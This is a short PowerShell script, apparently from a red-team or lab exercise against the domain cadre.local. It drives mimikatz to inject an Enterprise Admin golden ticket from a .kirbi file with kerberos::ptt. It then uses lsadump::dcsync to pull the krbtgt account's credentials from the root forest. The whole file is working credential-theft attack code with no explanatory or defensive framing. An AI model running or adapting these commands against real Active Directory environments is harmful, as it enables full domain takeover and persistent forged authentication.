[CmdletBinding()]
param(
    [string]$Ticket = "C:\Tools\cadre-attack\T102-capture\EA.kirbi"
)
$ErrorActionPreference = "Continue"

$mimi = 'C:\Tools\ADTools\mimikatz.exe'

Write-Output '--- ptt EA golden ticket ---'
& $mimi "privilege::debug" "kerberos::ptt $Ticket" "exit" 2>&1 | ForEach-Object { Write-Output "PTT|$_" }

Write-Output '--- DCSync cadre.local krbtgt (root forest) ---'
& $mimi "kerberos::ptt $Ticket" "lsadump::dcsync /domain:cadre.local /user:krbtgt" "exit" 2>&1 | ForEach-Object { Write-Output "DCSYNC|$_" }
